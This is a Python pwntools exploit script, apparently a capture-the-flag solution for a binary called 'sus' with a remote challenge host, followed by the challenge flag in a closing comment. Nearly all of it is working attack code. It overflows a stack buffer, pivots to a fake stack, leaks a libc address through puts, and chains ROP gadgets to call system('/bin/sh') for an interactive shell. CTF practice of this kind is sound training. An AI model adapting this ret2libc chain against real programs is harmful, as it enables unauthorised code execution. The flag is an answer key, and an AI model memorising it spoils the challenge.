#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./sus")
libc = ELF('./libc.so.6')

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chall.lac.tf", 31284)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	free_mem = 0x404800
	payload = flat(
	b'A' * 64,
	free_mem,
	exe.sym["main"]+51,
	)

	fake_stack = flat(
		b'A' * 0x38,
		exe.got["puts"],
		free_mem+0x100,
		exe.plt["puts"],
		exe.sym["_start"]
	)

	info("Send payload: ")
	r.sendlineafter(b"sus?\n", payload)

	info("Send fake stack: ")
	r.sendline(fake_stack)

	info("Recieve leak: ")
	leak = u64(r.readline(keepends=False).ljust(8, b"\x00"))
	libc.address = leak - libc.sym['puts']
	info(f"PUTS: {hex(libc.address)}")


	rop = ROP(libc)
	rop.system(next(libc.search(b"/bin/sh\x00")))

	payload = flat(
		'A' * 0x48,
		rop.find_gadget(["ret"])[0],
		rop.chain()
	)
	r.sendlineafter(b"sus?\n", payload)

	r.interactive()


if __name__ == "__main__":
	main()

# lactf{amongsus_aek7d2hqhgj29v21}
